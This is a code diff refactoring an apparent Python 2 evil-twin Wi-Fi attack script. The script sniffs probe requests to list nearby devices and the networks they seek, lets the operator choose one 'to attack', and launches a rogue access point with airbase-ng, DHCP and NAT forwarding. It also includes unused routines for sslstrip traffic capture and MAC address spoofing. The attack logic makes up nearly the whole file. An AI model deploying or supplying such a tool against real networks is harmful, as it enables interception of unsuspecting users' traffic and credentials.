@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
+import sys
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 try:
@@ -14,40 +15,39 @@ except:
 
 from datetime import datetime
 import threading
-from types import *
+import types
 from multiprocessing import Process
 from subprocess import call
 from subprocess import Popen
 from scapy.error import Scapy_Exception
-import sys
 import argparse
+import time
 
 
-index = {}
-n = 0
-internet_interface = "eth0"
-monitor_interface = "wlan0mon"
-ssid_to_attack = "FreeWifi" 
+INDEX = {}
+N = 0
 
 
 class Sniffing(threading.Thread):
-  
-    def __init__(self):
+    """Classe which sniff probe requests"""
+    def __init__(self, monitor_interface):
         threading.Thread.__init__(self)
-    
+        self.monitor_interface = monitor_interface
+        
     def run(self):
         
         try:
             def sort(pkt):
-                global index
-                global n
-                global shutdown_event 
+                global INDEX
+                global N
 
-                if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 4 and pkt.info != "" and not ((pkt.addr2,pkt.info) in index.keys()):
-                    n = n+1
-                    index[(pkt.addr2,pkt.info)] = n
+                if (pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 4 and 
+                        pkt.info != "" and not ((pkt.addr2, pkt.info) in INDEX.keys())):
+                    N = N + 1
+                    INDEX[(pkt.addr2, pkt.info)] = N
                     signal_strength = -(256-ord(pkt.notdecoded[-4:-3]))
-                    print "[" + str(n) + "] " + "%s               %s                      %s" % (pkt.addr2, pkt.info,signal_strength)
+                    print "[" + str(N) + "] " + "%s               %s         \
+                    %s" % (pkt.addr2, pkt.info, signal_strength)
                     time.sleep(1)
                     
         except Scapy_Exception("Filter parse error"):
@@ -56,14 +56,11 @@ class Sniffing(threading.Thread):
         
         try:
             def stop(pkt):
-                 
-                packet_to_string=str(pkt)
+                packet_to_string = str(pkt)
                 if packet_to_string.find("1.1.1.1"):
                     return True
-                
                 else:
                     return False
-                
                 time.sleep(1)
                 
         except Scapy_Exception("Filter parse error"):
@@ -71,18 +68,18 @@ class Sniffing(threading.Thread):
             
             
         try:
-            sniff(filter="", iface =monitor_interface, prn=sort, store=0, stop_filter=stop )
+            sniff(filter="", iface=self.monitor_interface, prn=sort, store=0, stop_filter=stop)
         except (KeyboardInterrupt, SystemExit, NameError):
             print ""
 
 def choice():
-    
-    global index
-    global client_to_attack
-    global ssid_to_attack
+    """Choose which # you want to emulatee"""
+    global INDEX
+    client_to_attack = ""
+    ssid_to_attack = ""
     number_is_correct = False
     
-    if len(index) == 0:
+    if len(INDEX) == 0:
         print "No probe readed, exiting program"
         sys.exit()
     
@@ -90,18 +87,20 @@ def choice():
         while not number_is_correct:
             number_to_attack = input("Select which # you want to attack (type a number): ")
             
-            if number_to_attack in index.values():
-                for tuple, number in index.items():
+            if number_to_attack in INDEX.values():
+                for tuple, number in INDEX.items():
                     if number == number_to_attack:
-                        client_to_attack,ssid_to_attack = tuple
+                        client_to_attack, ssid_to_attack = tuple
                         number_is_correct = True
-                        print "You choosed to attack Client %s with SSID %s" % (client_to_attack,ssid_to_attack)
+                        print "You choosed to attack Client %s with SSID %s" % (client_to_attack, ssid_to_attack)
             else:
-                print "Type a number in the range (1,%s)" % (len(index))    
+                print "Type a number in the range (1,%s)" % (len(INDEX))    
 
+    return ssid_to_attack
      
-def macchanger(): #Not used for the moment
-
+def macchanger(monitor_interface, internet_interface): #Not used for the moment
+    """Change MAC address of both monitor and internet interface"""
+    
     cmd = "ifconfig {0} down ; \
             ifconfig {1} down ; \
             sleep 0.2 ; \
@@ -109,23 +108,24 @@ def macchanger(): #Not used for the moment
             macchanger -r {3} ; \
             sleep 0.2 ; \
             ifconfig {4} up ; \
-            ifconfig {5} up".format(monitor_interface, internet_interface, monitor_interface, internet_interface, monitor_interface, internet_interface)
+            ifconfig {5} up".format(monitor_interface, internet_interface, 
+                    monitor_interface, internet_interface, monitor_interface, internet_interface)
     try:
         retcode = call(cmd, stdout=0, shell=True)
         
         if retcode < 0:
-            print >>sys.stderr, "Child was terminated by signal", -retcode
+            print >> sys.stderr, "Child was terminated by signal", -retcode
         else:
             print "Your MAC adresses have changed."
             
     except OSError as e:
-        print >>sys.stderr, "Execution failed:", e
+        print >> sys.stderr, "Execution failed:", e
 
 
 
-def fire_up_rogue_ap():
-  
-    global ssid_to_attack
+def fire_up_rogue_ap(ssid_to_attack, monitor_interface, internet_interface):
+    """Turn on the Rogue AP"""  
+    
     cmd_clean_iptables = 'echo "0" > /proc/sys/net/ipv4/ip_forward ; \
             iptables --flush ; \
             iptables -t nat --flush ; \
@@ -136,13 +136,14 @@ def fire_up_rogue_ap():
         retcode = call(cmd_clean_iptables, stdout=0, shell=True)
 
     except OSError as e:
-        print >>sys.stderr, "Execution failed:", e
+        print >> sys.stderr, "Execution failed:", e
     
 
     try:
-        proc_rogue_ap = subprocess.Popen(["sudo", "airbase-ng", "-v", "-c", "11", "-e", ssid_to_attack, monitor_interface])
+        proc_rogue_ap = subprocess.Popen(["sudo", "airbase-ng", "-v", "-c", "11", "-e", 
+                ssid_to_attack, monitor_interface])
     except OSError as e:
-        print >>sys.stderr, "Execution failed:", e
+        print >> sys.stderr, "Execution failed:", e
         proc_rogue_ap.kill()
     except KeyboardInterrupt:
         proc_rogue_ap.kill()
@@ -163,16 +164,17 @@ def fire_up_rogue_ap():
         dhcp_server = subprocess.Popen(["udhcpd", "/etc/udhcpd.conf"])
         retcode = call(cmd_configuration_ap, stdout=0, shell=True)
     except OSError as e:
-        print >>sys.stderr, "Execution failed:", e
+        print >> sys.stderr, "Execution failed:", e
     except KeyboardInterrupt:
         dhcp_server.kill()
 
-def exploitation(): #Not used for the moment
 
+def exploitation(): #Not used for the moment
+    """Tools to analyse traffic"""
     try:
         proc_iptables = subprocess.Popen(["sslstrip", "-w", "/root/Desktop/rogue.txt"])
     except OSError as e:
-        print >>sys.stderr, "Execution failed:", e
+        print >> sys.stderr, "Execution failed:", e
         proc_iptables.kill()
     except KeyboardInterrupt:
         proc_iptables.kill()
@@ -181,7 +183,7 @@ def exploitation(): #Not used for the moment
     try:
         proc_iptables = subprocess.Popen(["wireshark", "-i", "at0", "-k", "&"])
     except OSError as e:
-        print >>sys.stderr, "Execution failed:", e
+        print >> sys.stderr, "Execution failed:", e
         proc_iptables.kill()
     except KeyboardInterrupt:
         proc_iptables.kill()    
@@ -189,9 +191,9 @@ def exploitation(): #Not used for the moment
 
 def main():
   
-    global monitor_interface
-    global internet_interface
-    global ssid_to_attack
+    internet_interface = "eth0"
+    monitor_interface = "wlan0mon"
+    ssid_to_attack = "FreeWifi"
     
     parser = argparse.ArgumentParser()
     parser.add_argument("-m", "--monitor_interface", help="Specify wireless interface in monitor mode (wlan0mon by default).")
@@ -205,17 +207,16 @@ def main():
    
     if not args.SSID:
    
-        print "[%s] Starting scan \n"%datetime.now()
+        print "[%s] Starting scan \n" % datetime.now()
         print " #     Mac Client                   Probe request             Signal Strength"
     
     
         try:
             while 1:
-                thread1 = Sniffing()
+                thread1 = Sniffing(monitor_interface)
                 thread1.start()
                 thread1.join(timeout=0.1)
-                time.sleep(0.1)
-            
+                time.sleep(2)
         except (KeyboardInterrupt, SystemExit):
             print '\n\n! Received keyboard interrupt, quitting sniffing ! \n'
             mon_ping = Ether() / IP(src = "1.1.1.1", dst = "127.0.0.1")
@@ -224,16 +225,21 @@ def main():
         choice_correct = False
         while choice_correct is False:
             try:
-                choice()
+                ssid_to_attack = choice()
                 choice_correct = True
             except (KeyboardInterrupt, SystemExit):
                 print "\n\n! Received keyboard interrupt, quitting choice ! \n"
                 sys.exit()
             except (SyntaxError, NameError):
-                print "Type a number in the range (1,%s)" % (len(index))
-       
+                print "Type a number in the range (1,%s)" % (len(INDEX))
+        
+        print internet_interface
+        print monitor_interface
+        print ssid_to_attack
+        
         try:
-            f = Process(target=fire_up_rogue_ap)
+            f = Process(target=fire_up_rogue_ap, args=(ssid_to_attack, monitor_interface, 
+                    internet_interface))
             f.start()
             f.join()
             time.sleep(86400)    
@@ -244,10 +250,9 @@ def main():
     else:
         ssid_to_attack = args.SSID
         try:
-            p = Process(target=fire_up_rogue_ap)
+            p = Process(target=fire_up_rogue_ap, args=(ssid_to_attack, monitor_interface, 
+                    internet_interface))
             p.start()
-            p.join()
-            time.sleep(86400)    
         except (KeyboardInterrupt, SystemExit):
             print '\n\n! Received keyboard interrupt, quitting rogue AP ! \n'
             p.terminate()
@@ -256,8 +261,4 @@ def main():
         
     
 if __name__=="__main__":
-    main()                
-
-
-
-
+    main()              
